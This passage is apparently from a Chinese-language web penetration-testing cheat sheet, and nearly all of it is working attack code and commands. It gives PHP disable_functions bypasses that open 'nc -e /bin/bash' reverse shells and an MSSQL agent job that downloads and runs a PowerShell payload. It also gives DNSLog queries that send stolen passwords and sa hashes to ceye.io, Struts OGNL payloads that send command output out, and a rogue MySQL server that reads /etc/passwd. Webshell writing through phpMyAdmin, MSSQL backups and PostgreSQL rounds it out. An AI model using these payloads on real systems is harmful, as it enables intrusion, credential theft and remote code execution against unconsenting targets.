class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$handle</span> = popen(<span class="variable">$command</span> , <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">while</span>(!feof(<span class="variable">$handle</span>))</span><br><span class="line">&#123;        <span class="keyword">echo</span> fread(<span class="variable">$handle</span>, <span class="number">1024</span>);  <span class="comment">//fread($handle, 1024);</span></span><br><span class="line">&#125;</span><br><span class="line">pclose(<span class="variable">$handle</span>);<span class="meta">?&gt;</span></span><br><span class="line">-------------------------------------------------------</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$command</span>=<span class="string">&quot;ipconfig&quot;</span>;</span><br><span class="line"><span class="variable">$descriptorspec</span> = <span class="keyword">array</span>(<span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>));</span><br><span class="line"><span class="variable">$handle</span> = proc_open(<span class="variable">$command</span> ,<span class="variable">$descriptorspec</span> , <span class="variable">$pipes</span>);</span><br><span class="line"><span class="keyword">while</span>(!feof(<span class="variable">$pipes</span>[<span class="number">1</span>]))</span><br><span class="line">&#123;        <span class="keyword">echo</span> fread(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="number">1024</span>); <span class="comment">//fgets($pipes[1],1024);</span></span><br><span class="line">&#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec"></a>pcntl_exec</h5><pre><code>开启了pcntl 扩展，并且php 4&gt;=4.2.0 , php5，linux
</code></pre>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(function_exists(<span class="string">&#x27;pcntl_exec&#x27;</span>)) &#123;</span><br><span class="line">pcntl_exec(<span class="string">&quot;/bin/bash&quot;</span>, <span class="keyword">array</span>(<span class="string">&quot;/tmp/test.sh&quot;</span>));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;pcntl extension is not support!&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<pre><code>test.sh
#!/bin/bash
nc -e /bin/bash 1.1.1.1 8888       #反弹shell
</code></pre>
<h5 id="imap-open函数"><a href="#imap-open函数" class="headerlink" title="imap_open函数"></a>imap_open函数</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (!function_exists(<span class="string">&#x27;imap_open&#x27;</span>)) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;no imap_open function!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$server</span> = <span class="string">&quot;x -oProxyCommand=echo\t&quot;</span> . base64_encode(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>] . <span class="string">&quot;&gt;/tmp/cmd_result&quot;</span>) . <span class="string">&quot;|base64\t-d|sh&#125;&quot;</span>;</span><br><span class="line">imap_open(<span class="string">&#x27;&#123;&#x27;</span> . <span class="variable">$server</span> . <span class="string">&#x27;:143/imap&#125;INBOX&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">sleep(<span class="number">5</span>);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">&quot;/tmp/cmd_result&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="php7-4-FFI绕过"><a href="#php7-4-FFI绕过" class="headerlink" title="php7.4 FFI绕过"></a>php7.4 FFI绕过</h5><pre><code>php 7.4
ffi.enable=true
</code></pre>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;nc -e /bin/bash ip 8888&#x27;</span>;</span><br><span class="line"><span class="variable">$ffi</span> = FFI::cdef(</span><br><span class="line">    <span class="string">&quot;int system(char *command);&quot;</span>,</span><br><span class="line">    <span class="string">&quot;libc.so.6&quot;</span>);</span><br><span class="line"><span class="variable">$ffi</span>-&gt;system(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="shellshock"><a href="#shellshock" class="headerlink" title="shellshock"></a>shellshock</h5><pre><code>存在CVE-2014-6271漏洞
PHP 5.*，linux，putenv()、mail()可用
</code></pre>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shellshock</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$tmp</span> = tempnam(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;data&quot;</span>);</span><br><span class="line">putenv(<span class="string">&quot;PHP_LOL=() &#123; x; &#125;; <span class="subst">$cmd</span> &gt;<span class="subst">$tmp</span> 2&gt;&amp;1&quot;</span>);</span><br><span class="line">mail(<span class="string">&quot;a@127.0.0.1&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;-bv&quot;</span>);</span><br><span class="line"><span class="variable">$output</span> = @file_get_contents(<span class="variable">$tmp</span>);</span><br><span class="line">@unlink(<span class="variable">$tmp</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$output</span> != <span class="string">&quot;&quot;</span>) <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> <span class="string">&quot;No output, or not vuln.&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> shellshock(<span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="蚁剑插件"><a href="#蚁剑插件" class="headerlink" title="蚁剑插件"></a>蚁剑插件</h5><pre><code>01利用LD_PRELOAD环境变量
02利用ShellShock（CVE-2014-6271）
03利用Apache Mod CGI
04 PHP-FPM利用LD_PRELOAD环境变量（同1）
05攻击PHP-FPM监听端口
06 Json Serializer UAF
07具有特定析构函数UAF的PHP7 GC
</code></pre>
<h4 id="open-basedir绕过"><a href="#open-basedir绕过" class="headerlink" title="open_basedir绕过"></a>open_basedir绕过</h4><pre><code>第一种
http://x.com/shell.php?a=$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#39; &#39;);&#125;;
http://x.com/shell.php?a=if%20(%20$b%20=%20opendir(%22glob:///var/www/html/*.php%22)%20)%20&#123;while%20(%20($file%20=%20readdir($b))%20!==%20false%20)%20&#123;echo%20%22filename:%22.$file.%22\n%22;&#125;closedir($b);&#125;
第二种
http://x.com/shell.php?a=ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);system(&#39;cat ../../../../../etc/passwd&#39;);
http://x.com/shell.php?a=mkdir(%22/tmp/crispr%22);chdir(%27/tmp/crispr/%27);ini_set(%27open_basedir%27,%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);ini_set(%27open_basedir%27,%27/%27);print_r(scandir(%27.%27))
第三种
命令执行绕过
读文件
?a=show_source(&#39;preload.php&#39;);
?a=echo(readfile(&#39;preload.php&#39;));
?a=print_r(readfile(&#39;preload.php&#39;));
?a=echo(file_get_contents(&#39;preload.php&#39;));
?a=print_r(file_get_contents(&#39;preload.php&#39;));
</code></pre>
<h4 id="Tomcat-Ajp-LFI-amp-RCE"><a href="#Tomcat-Ajp-LFI-amp-RCE" class="headerlink" title="Tomcat Ajp LFI&amp;RCE"></a>Tomcat Ajp LFI&amp;RCE</h4><pre><code>LFI
https://github.com/Kit4y/CNVD-2020-10487-Tomcat-Ajp-lfi-Scanner
&gt;python CNVD-2020-10487-Tomcat-Ajp-lfi.py 192.168.0.110 -p 8009 -f pass
</code></pre>
<p><img src="41.png" alt="image"></p>
<pre><code>RCE
&gt;msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.0.107 LPORT=12138 R &gt;/var/www/html/1.jpg
配合目标文件上传传入服务器
</code></pre>
<p><img src="42.png" alt="image"></p>
<pre><code>&gt;java -jar ajpfuzzer_v0.6.jar
&gt;connect 192.168.0.110 8009
&gt;forwardrequest 2 &quot;HTTP/1.1&quot; &quot;/index.jsp&quot; 192.168.0.107 192.168.0.107 porto 8009 false &quot;Cookie:AAAA=BBBB&quot;,&quot;Accept-Encoding:identity&quot; &quot;javax.servlet.include.request_uri:index.jsp&quot;,&quot;javax.servlet.include.path_info:/1.jpg&quot;,&quot;javax.servlet.include.servlet_path:/&quot;
</code></pre>
<p><img src="43.png" alt="image"></p>
<h4 id="Mysql连接文件读取"><a href="#Mysql连接文件读取" class="headerlink" title="Mysql连接文件读取"></a>Mysql连接文件读取</h4><pre><code>https://github.com/Gifts/Rogue-MySql-Server
客户端必须启用LOCAL-INFILE 
客户端支持非SSL连接
目标web存在adminer等可检查数据库连接的脚本。
攻击机本地运行python构造假mysql服务，使用目标web连接，读取文件。
#coding=utf-8 
import socket
import logging
logging.basicConfig(level=logging.DEBUG)
filename=&quot;/etc/passwd&quot;
sv=socket.socket()
sv.bind((&quot;&quot;,3305))
sv.listen(5)
conn,address=sv.accept()
logging.info(&#39;Conn from: %r&#39;, address)
conn.sendall(&quot;\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00&quot;)
conn.recv(9999)
logging.info(&quot;auth okay&quot;)
conn.sendall(&quot;\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00&quot;)
conn.recv(9999)
logging.info(&quot;want file...&quot;)
wantfile=chr(len(filename)+1)+&quot;\x00\x00\x01\xFB&quot;+filename
conn.sendall(wantfile)
content=conn.recv(9999)
logging.info(content)
conn.close()
</code></pre>
<h4 id="Mysql开启外连"><a href="#Mysql开启外连" class="headerlink" title="Mysql开启外连"></a>Mysql开启外连</h4><pre><code>&gt;grant all privileges on user.* to user@&quot;%&quot; identified by &quot;P@ssw0rd&quot;;
</code></pre>
<h4 id="MSSQL-amp-Agent-Job上线"><a href="#MSSQL-amp-Agent-Job上线" class="headerlink" title="MSSQL&amp;Agent Job上线"></a>MSSQL&amp;Agent Job上线</h4><pre><code>USE msdb; EXEC dbo.sp_add_job @job_name = N&#39;syspolicy_purge_now&#39; ; EXEC sp_add_jobstep @job_name = N&#39;syspolicy_purge_now&#39;, @step_name = N&#39;syspolicy_purge_step1&#39;, @subsystem = N&#39;PowerShell&#39;, @command = N&#39;powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;&#39;http://IP_OR_HOSTNAME/file&#39;&#39;))&quot;&#39;, @retry_attempts = 1, @retry_interval = 5 ;EXEC dbo.sp_add_jobserver @job_name = N&#39;syspolicy_purge_now &#39;; EXEC dbo.sp_start_job N&#39;syspolicy_purge_now &#39;;
使用在注入点处，使用burp进行url编码，编码后前面加%20(空格URL编码)
</code></pre>
<h4 id="注入无列名"><a href="#注入无列名" class="headerlink" title="注入无列名"></a>注入无列名</h4><pre><code>http://url/index.php?id=1 order by 6
http://url/index.php?id=-1 union select 1,(select `4` from (select 1,2,3,4,5,6 union select * from users)a limit 1,1)-- -
http://url/index.php?id=-1 union select 1,(select concat(`3`,0x3a,`4`) from (select 1,2,3,4,5,6 union select * from users)a limit 1,1)-- -
</code></pre>
<h4 id="DNSLog"><a href="#DNSLog" class="headerlink" title="DNSLog"></a>DNSLog</h4><pre><code>http://ceye.io
http://www.dnslog.cn/
</code></pre>
<h5 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h5><h6 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h6><pre><code>显示数据库
?id=1&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.jhsefs.ceye.io\\sql_test&#39;))),1,0)--+
显示数据库
?id=1&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select schema_name from information_schema.schemata limit &#123;0&#125;,1),&#39;.jhsefs.ceye.io\\sql_test&#39;))),1,0)--+
显示表
?id=1&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select table_name from information_schema.tables where table_schema=&#39;dbname&#39; limit 0,1),&#39;.jhsefs.ceye.io\\sql_test&#39;))),1,0)--+
?id=1&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select table_name from information_schema.tables where table_schema=0x1x1x2x limit 0,1),&#39;.jhsefs.ceye.io\\sql_test&#39;))),1,0)--+
显示字段
?id=1&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),&#39;.jhsefs.ceye.io\\sql_test&#39;))),1,0)--+
显示数据
?id=1&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select hex(user) from users limit 0,1),&#39;.jhsefs.ceye.io\\sql_test&#39;))),1,0)--+
</code></pre>
<h6 id="MSSQL-2"><a href="#MSSQL-2" class="headerlink" title="MSSQL"></a>MSSQL</h6><pre><code>查数据
?id=1;DECLARE @host varchar(1024);SELECT @host=(SELECT master.dbo.fn_varbintohexstr(convert(varbinary,rtrim(pass))) FROM test.dbo.test_user where [USER] = &#39;admin&#39;)%2b&#39;.cece.nk40ci.ceye.io&#39;;EXEC(&#39;master..xp_dirtree &quot;\&#39;%2b@host%2b&#39;\foobar$&quot;&#39;);
Sa密码
?id=1DECLARE @host varchar(1024);SELECT @host=(SELECT TOP 1 master.dbo.fn_varbintohexstr(password_hash)FROM sys.sql_loginsWHERE name=&#39;sa&#39;)+&#39;.ip.port.b182oj.ceye.io&#39;;EXEC(&#39;master..xp_dirtree&quot;\&#39;+@host+&#39;\foobar$&quot;&#39;);
执行命令
exec master..xp_cmdshell &quot;whoami&gt;D:/temp%26%26certutil -encode D:/temp D:/temp2%26%26findstr /L /V &quot;&quot;CERTIFICATE&quot;&quot; D:/temp2&gt;D:/temp3&quot;;
exec master..xp_cmdshell &quot;cmd /v /c&quot;&quot;set /p MYVAR=&lt; D:/temp3 %26%26 set FINAL=!MYVAR!.xxx.ceye.io %26%26 ping !FINAL!&quot;&quot;&quot;;
exec master..xp_cmdshell &quot;del &quot;&quot;D:/temp&quot;&quot; &quot;&quot;D:/temp2&quot;&quot; &quot;&quot;D:/temp3&quot;&quot;&quot;;
</code></pre>
<h6 id="postgreSQL"><a href="#postgreSQL" class="headerlink" title="postgreSQL"></a>postgreSQL</h6><pre><code>?id=1;DROP TABLE IF EXISTS table_output;CREATE TABLE table_output(content text);CREATE OR REPLACE FUNCTION temp_function() RETURNS VOID AS $$ DECLARE exec_cmd TEXT;DECLARE query_result TEXT;BEGIN SELECT INTO query_result (select encode(pass::bytea,&#39;hex&#39;) from test_user where id =1);exec_cmd := E&#39;COPY table_output(content) FROM E\&#39;\\\\\\\\&#39;||query_result||E&#39;.pSQL.3.nk40ci.ceye.io\\\\foobar.txt\&#39;&#39;;EXECUTE exec_cmd;END;$$ LANGUAGE plpgSQL SECURITY DEFINER;SELECT temp_function();
</code></pre>
<h6 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h6><pre><code>?id=1 union SELECT UTL_HTTP.REQUEST((select pass from test_user where id=1)||&#39;.nk40ci.ceye.io&#39;) FROM sys.DUAL;
?id=1 union SELECT DBMS_LDAP.INIT((select pass from test_user where id=1)||&#39;.nk40ci.ceye.io&#39;,80) FROM sys.DUAL;
?id=1 union SELECT HTTPURITYPE((select pass from test_user where id=1)||&#39;.xx.nk40ci.ceye.io&#39;).GETCLOB() FROM sys.DUAL;
?id=1 union SELECT UTL_INADDR.GET_HOST_ADDRESS((select pass from test_user where id=1)||&#39;.ddd.nk40ci.ceye.io&#39;) FROM sys.DUAL;
</code></pre>
<h5 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h5><pre><code>&gt;curl http://0ox095.ceye.io/`whoami`
&gt;ping `whoami`.b182oj.ceye.io
&gt;ping %CD%.lfofz7.dnslog.cn 
&amp;
cmd /v /c &quot;whoami &gt; temp &amp;&amp; certutil -encode temp temp2 &amp;&amp; findstr /L /V &quot;CERTIFICATE&quot; temp2 &gt; temp3 &amp;&amp; set /p MYVAR=&lt; temp3 &amp;&amp; set FINAL=!MYVAR!.xxx.ceye.io &amp;&amp; nslookup !FINAL!&quot;
</code></pre>
<h5 id="XXE-1"><a href="#XXE-1" class="headerlink" title="XXE"></a>XXE</h5><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE root [
&lt;!ENTITY % remote SYSTEM &quot;http://b182oj.ceye.io/xxe_test&quot;&gt;
%remote;]&gt;
&lt;root/&gt;
</code></pre>
<h5 id="Struts"><a href="#Struts" class="headerlink" title="Struts"></a>Struts</h5><pre><code>xx.action?redirect:http://b182oj.ceye.io/%25&#123;3*4&#125;
xx.action?redirect:$&#123;%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]&#123;&#39;whoami&#39;&#125;)).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23t%3d%23d.readLine(),%23u%3d&quot;http://b182oj.ceye.io/result%3d&quot;.concat(%23t),%23http%3dnew%20java.net.URL(%23u).openConnection(),%23http.setRequestMethod(&quot;GET&quot;),%23http.connect(),%23http.getInputStream()&#125;
</code></pre>
<h5 id="weblogic"><a href="#weblogic" class="headerlink" title="weblogic"></a>weblogic</h5><pre><code>/uddiexplorer/SearchPublicRegistries.jsp?operator=http://b182oj.ceye.io/test&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Businesslocation&amp;btnSubmit=Search
</code></pre>
<h5 id="Resin"><a href="#Resin" class="headerlink" title="Resin"></a>Resin</h5><pre><code>xxoo.com/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=http://b182oj.ceye.io/ssrf
</code></pre>
<h5 id="Discuz-1"><a href="#Discuz-1" class="headerlink" title="Discuz"></a>Discuz</h5><pre><code>/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img=1,1]http://b182oj.ceye.io/xx.jpg[/img]&amp;formhash=xxoo
</code></pre>
<h4 id="PHPMyadmin"><a href="#PHPMyadmin" class="headerlink" title="PHPMyadmin"></a>PHPMyadmin</h4><h5 id="LOG"><a href="#LOG" class="headerlink" title="LOG"></a>LOG</h5><pre><code>show variables like &#39;%general%&#39;;  #查看配置
set global general_log = on;  #开启general log模式
set global general_log_file = &#39;/var/www/html/1.php&#39;; 
select &#39;&lt;?php eval($_POST[cmd]);?&gt;&#39;
</code></pre>
<h5 id="慢查询"><a href="#慢查询" class="headerlink" title="慢查询"></a>慢查询</h5><pre><code>show variables like &#39;%slow%&#39;;
set GLOBAL slow_query_log_file=&#39;C:/WWW/slow.php&#39;;
set GLOBAL slow_query_log=on;
set GLOBAL log_queries_not_using_indexes=on;
select &#39;&lt;?php phpinfo();?&gt;&#39; from mysql.db where sleep(10);
</code></pre>
<h5 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h5><pre><code>phpMyAdmin 2.x
POST /scripts/setup.php HTTP/1.1
Host: ip:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 80

action=test&amp;configuration=O:10:&quot;PMA_Config&quot;:1:&#123;s:6:&quot;source&quot;,s:11:&quot;/etc/passwd&quot;;&#125;
</code></pre>
<h5 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h5><pre><code>phpMyAdmin 4.0.1--4.2.12，PHP &lt; 5.3.4
/gis_data_editor.php?token=2941949d3768c57b4342d94ace606e91&amp;gis_data[gis_type]=/../../../../phpinfo.txt%00
phpMyAdmin 4.8.0和4.8.1 后台权限
&gt;select &#39;&lt;?php phpinfo();exit;?&gt;&#39;
/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_***
</code></pre>
<h5 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h5><pre><code>PhpMyAdmin 4.0.x-4.6.2，PHP 4.3.0-5.4.6后台权限
&gt;cve-2016-5734.py -u root --pwd=&quot;&quot; http://localhost/pma -c &quot;system(&#39;ls -lua&#39;);&quot;
phpMyAdmin 4.8.0~4.8.3
CREATE DATABASE foo;
CREATE TABLE foo.bar (baz VARCHAR(100) PRIMARY KEY );
INSERT INTO foo.bar SELECT &#39;&lt;?php phpinfo(); ?&gt;&#39;;
访问http://10.1.1.10/chk_rel.php?fixall_pmadb=1&amp;db=foo
INSERT INTO pma__column_infoSELECT &#39;1&#39;, &#39;foo&#39;, &#39;bar&#39;, &#39;baz&#39;, &#39;plop&#39;,
&#39;plop&#39;, &#39;plop&#39;, &#39;plop&#39;,&#39;../../../../../../../../tmp/sess_***&#39;,&#39;plop&#39;;
访问
/tbl_replace.php?db=foo&amp;table=bar&amp;where_clause=1=1&amp;fields_name[multi_edit][][]=baz&amp;clause_is_unique=1
</code></pre>
<h4 id="PHP-FPM-RCE"><a href="#PHP-FPM-RCE" class="headerlink" title="PHP-FPM RCE"></a>PHP-FPM RCE</h4><pre><code>&gt;git clone https://github.com/neex/phuip-fpizdam.git
&gt;cd phuip-fpizdam
&gt;go get -v &amp;&amp; go build
&gt;go run . http://127.0.0.1/index.php
http://127.0.0.1/index.php?a=id
多执行几次
</code></pre>
<h4 id="phpstudy后门"><a href="#phpstudy后门" class="headerlink" title="phpstudy后门"></a>phpstudy后门</h4><pre><code>php:5.2.17   5.4.45

GET / HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding:gzip,deflate
Accept-Charset:c3lzdGVtKCJuZXQgdXNlciIpOw==
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Length: 2
</code></pre>
<h4 id="cmdhijack"><a href="#cmdhijack" class="headerlink" title="cmdhijack"></a>cmdhijack</h4><pre><code>From: https://hackingiscool.pl/
poc完整的命令行
cmd.exe /c &quot;ping 127.0.0.1/../../../../../../../../../../windows/system32/calc.exe&quot;
可能产生的影响
包括拒绝服务，信息泄露，任意代码执行（取决于目标应用程序和系统）。
以web应用为例
</code></pre>
<p><img src="660.png" alt="image"></p>
<pre><code>由于使用了escapeshellcmd()，不易受命令注入的影响，使用本方法
一个poc
</code></pre>
<p><img src="661.png" alt="image"><br><img src="662.png" alt="image"></p>
<pre><code>不限于任何位置，文件
</code></pre>
<p><img src="663.png" alt="image"></p>
<pre><code>再扩展一下 
如，powershell带-enc执行，或mshta等方法，可参考
https://lolbas-project.github.io/，但是依照windows的特性，在无法将完整字符串解析为有效路径的情况下，会拆分空格后面的内容，这里可以使用&amp;符号
如：
&gt;cmd.exe /c &quot;cmd /c /../../../../../../../../../../windows/system32/calc&amp;powershell -enc xxxx&quot;
&gt;cmd.exe /c &quot;cmd /c /../../../../../../../../../../windows/system32/calc&amp;mshta http://192.168.0.105:8080/xsuUEWJ.hta&quot;
</code></pre>
<p><img src="664.png" alt="image"></p>
<h3 id="Database"><a href="#Database" class="headerlink" title="Database"></a>Database</h3><h4 id="MSSQL-3"><a href="#MSSQL-3" class="headerlink" title="MSSQL"></a>MSSQL</h4><pre><code>判断数据库
;and (select count(*) from sysobjects)&gt;0 mssql
;and (select count(*) from msysobjects)&gt;0 access
查库
?id=1 and (SELECT top 1 Name FROM Master..SysDatabases)&gt;0 --
?id=1 and (SELECT top 1 Name FROM Master..SysDatabases where name not in (&#39;master&#39;))&gt;0 --
查表
import requests
import re

table_list = [&#39;&#39;]

def get_sqlserver_table(table_list, table_num):
    for num in range(0,table_num):
        # print(&quot;&#39;,&#39;&quot;.join(table_list))
        sql_str = &quot;and (select top 1 name from [xxxx].sys.all_objects where type=&#39;U&#39; AND is_ms_shipped=0 and name not in (&#39;&#123;&#125;&#39;))&gt;0&quot;.format(&quot;&#39;,&#39;&quot;.join(table_list))
        url = &quot;http://www.xxxxx.cn/x.aspx?cid=1&#39; &#123;&#125; AND &#39;aNmV&#39;=&#39;aNmV&quot;.format(sql_str)
        r = requests.get(url, headers = &#123;&#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36&#39;&#125;)
        res = re.search(r&#39;\&#39;(.*)\&#39;&#39;, r.content.decode(&#39;utf-8&#39;),  re.M|re.I)
        table_name = str(res.group(1))
        table_list.append(table_name)
        print(&quot;[&#123;&#125;] - TableName: &#123;&#125;&quot;.format(str(r.status_code), table_name))
if __name__ == &quot;__main__&quot;:
    get_sqlserver_table(table_list, 16)

判断是否存在xp_cmdshell
and 1=(select count(*) from master.dbo.sysobjects where xtype = &#39;x&#39; and name = &#39;xp_cmdshell&#39;)
执行命令
;exec master..xp_cmdshell &quot;net user name password /add&quot;—
查看权限
and (select IS_SRVROLEMEMBER(&#39;sysadmin&#39;))=1--  //sa
and (select IS_MEMBER(&#39;db_owner&#39;))=1--   //  dbo
and (select IS_MEMBER(&#39;public&#39;))=1--  //public
站库分离获取服务器IP
;insert into OPENROWSET(&#39;SQLOLEDB&#39;,&#39;uid=sa;pwd=xxx;Network=DBMSSOCN;Address=你的ip,80;&#39;, &#39;select * from dest_table&#39;) select * from src_table;--
LOG备份
;alter database testdb set RECOVERY FULL --
;create table cmd (a image) --
;backup log testdb to disk = &#39;c:\wwwroot\shell.asp&#39; with init --
;insert into cmd (a) values (&#39;&lt;%%25Execute(request(&quot;chopper&quot;))%%25&gt;&#39;)-- 
;backup log testdb to disk = &#39;c:\wwwroot\shell.asp&#39; –
2000差异备份
;backup database testdb to disk =&#39;c:\wwwroot\bak.bak&#39;;--
;create table [dbo].[testtable] ([cmd] [image]);--
;insert into testtable (cmd) values(木马hex编码);--
;backup database testdb to disk=&#39;c:\wwwroot\upload\shell.asp&#39; WITH DIFFERENTIAL,FORMAT;--
2005差异备份
;alter/**/database/**/[testdb]/**/set/**/recovery/**/full—
;declare/**/@d/**/nvarchar(4000)/**/select/**/@d=0x640062006200610063006B00/**/backup/**/database/**/[testdb]/**/to/**/disk=@d/**/with/**/init--
;create/**/table/**/[itpro]([a]/**/image)—
;declare/**/@d/**/nvarchar(4000)/**/select/**/@d=0x640062006200610063006B00/**/backup/**/log/**/[testdb]/**/to/**/disk=@d/**/with/**/init--
;insert/**/into/**/[itpro]([a])/**/values(木马hex编码)—
;declare/**/@d/**/nvarchar(4000)/**/select/**/@d=木马保存路径的SQL_EN编码/**/backup/**/log/**/[testdb]/**/to/**/disk=@d/**/with/**/init--
;drop/**/table/**/[itpro]—
;declare/**/@d/**/nvarchar(4000)/**/select/**/@d=0x640062006200610063006B00/**/backup/**/log/**/[testdb]/**/to/**/disk=@d/**/with/**/init--
</code></pre>
<h4 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h4><pre><code>连接
&gt;psql -U dbuser -d exampledb -h 127.0.0.1 -p 5432
查看版本
&gt;select version();
列出数据库
&gt;select datname from pg_database;
列出所有表名
&gt;select * from pg_tables;
读取账号秘密
&gt;select usename,passwd from pg_shadow;
当前用户
&gt;select user;
修改密码
&gt;alter user postgres with password &#39;123456&#39;;
列目录
&gt;select pg_ls_dir(&#39;/etc&#39;);
读文件
&gt;select pg_read_file(&#39;postgresql.auto.conf&#39;,0,100); #行数
&amp;
&gt;drop table wooyun;
&gt;create table wooyun(t TEXT);
&gt;copy wooyun FROM &#39;/etc/passwd&#39;;
&gt;select * from wooyun limit 1 offset 0;
&amp;
&gt;select lo_import(&#39;/etc/passwd&#39;,12345678);
&gt;select array_agg(b)::text::int from(select encode(data,&#39;hex&#39;)b,pageno from pg_largeobject where loid=12345678 order by pageno)a;
写文件
create table shell(shell text not null);
insert into shell values($$&lt;?php @eval($_POST[1]);?&gt;$$);
copy shell(shell) to &#39;/var/www/html/shell.php&#39;;
&amp;
copy (select &#39;&lt;?php phpinfo();?&gt;&#39;) to &#39;/var/www/html/shell.php&#39;;
爆破
MSF&gt;use auxiliary/scanner/postgres/postgres_login
执行命令版本8.2以下
&gt;create function system(cstring) returns int AS &#39;/lib/libc.so.6&#39;, &#39;system&#39; language C strict;
